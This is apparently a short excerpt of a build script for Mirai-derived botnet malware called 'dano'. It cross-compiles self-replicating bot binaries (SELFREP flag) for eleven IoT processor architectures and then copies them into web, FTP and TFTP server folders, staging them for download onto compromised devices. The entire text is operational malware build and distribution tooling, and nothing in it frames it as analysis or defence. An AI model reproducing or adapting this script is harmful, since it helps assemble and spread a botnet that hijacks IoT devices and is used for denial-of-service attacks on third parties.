...
function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DSELFREP -DMIRAI_BOT_ARCH=\""$1"\"
...
compile_bot i586 dano.x86 "-static -DSELFREP"
compile_bot mips dano.mips "-static -DSELFREP"
compile_bot mipsel dano.mpsl "-static -DSELFREP"
compile_bot armv4l dano.arm "-static -DSELFREP"
compile_bot armv5l dano.arm5 "-DSELFREP"
compile_bot armv6l dano.arm6 "-static -DSELFREP"
compile_bot armv7l dano.arm7 "-static -DSELFREP"
compile_bot powerpc dano.ppc "-static -DSELFREP"
compile_bot sparc dano.spc "-static -DSELFREP"
compile_bot m68k dano.m68k "-static -DSELFREP"
compile_bot sh4 dano.sh4 "-static -DSELFREP"

cp release/dano.* /var/www/html/bins
cp release/dano.* /var/ftp
mv release/dano.* /var/lib/tftpboot
rm -rf release
